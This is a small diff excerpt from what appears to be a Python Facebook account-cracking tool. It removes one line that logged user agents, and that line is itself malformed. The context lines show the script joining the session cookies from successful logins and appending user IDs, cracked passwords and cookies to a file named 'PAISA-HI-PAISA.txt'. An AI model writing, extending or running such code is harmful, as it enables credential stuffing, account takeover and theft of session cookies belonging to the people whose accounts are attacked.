@@ -1375,7 +1375,6 @@ def rndmx(ids,pasx,tl):
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                 if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
                                 open('/sdcard/PAISA-HI-PAISA.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
-                                open('/sdcard/USERAGENTBOX.txt','a').write(str(user_agent)'\n')
                                 ok.append(str(uid))
                                 break
                         elif 'www.facebook.com' in po['error']['message']: 
